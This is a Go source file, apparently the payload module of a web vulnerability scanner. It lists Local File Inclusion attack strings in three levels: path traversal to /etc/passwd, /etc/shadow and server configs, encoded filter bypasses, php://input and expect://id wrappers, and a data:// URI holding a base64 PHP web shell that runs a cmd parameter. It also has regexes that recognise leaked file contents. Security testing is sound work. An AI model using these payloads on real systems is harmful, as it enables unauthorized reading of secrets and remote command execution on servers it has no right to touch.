package payloads

import "regexp"

// LFIPayloads contains Local File Inclusion payloads organized by level
// Level 1 = Basic, Level 2 = Normal, Level 3 = Aggressive
var LFIPayloads = map[int][]string{
	1: { // Basic
		"../../../etc/passwd",
		"..\\..\\..\\windows\\win.ini",
		"/etc/passwd",
	},
	2: { // Normal
		"../../../etc/passwd",
		"..\\..\\..\\windows\\win.ini",
		"/etc/passwd",
		"....//....//....//etc/passwd",
		"..%2F..%2F..%2Fetc%2Fpasswd",
		"..%252f..%252f..%252fetc%252fpasswd",
		"/etc/passwd%00",
		"php://filter/convert.base64-encode/resource=/etc/passwd",
		"php://input",
		"file:///etc/passwd",
	},
	3: { // Aggressive
		"../../../etc/passwd",
		"..\\..\\..\\windows\\win.ini",
		"/etc/passwd",
		"....//....//....//etc/passwd",
		"..%2F..%2F..%2Fetc%2Fpasswd",
		"..%252f..%252f..%252fetc%252fpasswd",
		"/etc/passwd%00",
		"php://filter/convert.base64-encode/resource=/etc/passwd",
		"php://input",
		"file:///etc/passwd",
		"/var/log/apache2/access.log",
		"/var/log/nginx/access.log",
		"/proc/self/environ",
		"expect://id",
		"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
		"..%c0%af..%c0%af..%c0%afetc/passwd",
		"..%255c..%255c..%255cetc/passwd",
		"/etc/shadow",
		"/etc/hosts",
		"/etc/apache2/apache2.conf",
		"/etc/nginx/nginx.conf",
		"/var/www/html/config.php",
		"php://filter/read=convert.base64-encode/resource=index.php",
	},
}

// LFISuccessPatterns contains regex patterns to detect successful LFI
var LFISuccessPatterns = []*regexp.Regexp{
	regexp.MustCompile(`root:.*:0:0:`),             // /etc/passwd
	regexp.MustCompile(`\[extensions\]`),           // win.ini
	regexp.MustCompile(`; for 16-bit app support`), // win.ini
	regexp.MustCompile(`\[boot loader\]`),          // boot.ini
	regexp.MustCompile(`HTTP_USER_AGENT`),          // /proc/self/environ
	regexp.MustCompile(`DOCUMENT_ROOT`),            // /proc/self/environ
	regexp.MustCompile(`<?php`),                    // PHP source
	regexp.MustCompile(`<\?=`),                     // PHP short tag
	regexp.MustCompile(`PD9waHA`),                  // base64 encoded <?php
	regexp.MustCompile(`DocumentRoot`),             // Apache config
	regexp.MustCompile(`server_name`),              // Nginx config
}

// GetLFIPayloads returns LFI payloads for the given level
func GetLFIPayloads(level int) []string {
	if p, ok := LFIPayloads[level]; ok {
		return p
	}
	return LFIPayloads[2] // Default to normal
}

// MatchesLFISuccess checks if body matches any LFI success pattern
func MatchesLFISuccess(body string) (bool, string) {
	for _, pattern := range LFISuccessPatterns {
		if pattern.MatchString(body) {
			return true, pattern.String()
		}
	}
	return false, ""
}
